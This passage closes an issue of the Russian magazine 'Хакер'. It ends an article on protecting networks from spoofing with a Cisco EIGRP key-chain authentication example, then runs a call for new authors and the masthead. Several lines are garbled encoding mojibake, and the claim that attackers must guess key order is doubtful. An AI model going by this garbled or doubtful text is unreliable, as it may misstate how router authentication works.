При мер использования аутентифика ции для EIGRP:


NightmareRouter(config)# key chain EIGRPWITHKEYCHAINS
NightmareRouter(config-keychain)# key 1
NightmareRouter(config-keychain-key)# key-string <KEYSTRING>
NightmareRouter(config-keychain)# key 2
NightmareRouter(config-keychain-key)# key-string <KEYSTRING>
NightmareRouter(config)# interface GigabitEthernet X/X
NightmareRouter(config-if)# ip authentication mode eigrp <ASN> md5
NightmareRouter(config-if)# ip authentication key-chain eigrp <ASN>
EIGRPWITHKEYCHAINS

Здесь можно исполь зовать даже Keychain-аутентификацию. Это такой стиль
аутентификации, при котором применя ется нес коль ко ключей. Это усложнит
жизнь ата кующе му, поскольку при дется не толь ко брутить ключи, но еще
и уга дать их порядок.


ÂÛÂÎÄÛ

Я  рассмотрел  основные  концепции,  которые  помогут  защитить  сети
от Spoong-атак. По моему мнению, мощность функций сетевого обо рудо-
вания криминально недооценивают. Уме ло используя их, ты можешь сде лать
очень многое для безопас ности сети. Одна ко подходить к этому нужно
с умом и пониманием внутренних про цессов в сети.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №8 (293)

          Андрей Письмен ный    Вален тин Холмогоров        Илья Русанен
              Главный редактор         Ведущий редактор             Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                 Иван Андреев, Олег Афонин,
                                   Марк Бруцкий-Стем-
                                      пковский, Алексей Глазков,
                                            Nik Zerof, Юрий Язев


                             РЕКЛАМА

                                  Анна Яковлева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Вопросы о подписке:      Воп росы о материалах:
                                 lapina@glc.ru               support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, стро ение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Оле гович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоко лам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информа цион ных технологий и массовых коммуника ций (Роскомнадзоре), сви детельство Эл № ФС77-67001 от 30.
08.2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставля ются как информация
к размышлению. Лица, использующие дан ную информа цию в противо законных целях, могут быть прив лечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По воп росам лицензирования и получения прав на использование
редакцион ных материалов жур нала обра щайтесь по адресу: xakep@glc.ru. © Жур нал «Хакер», РФ, 2022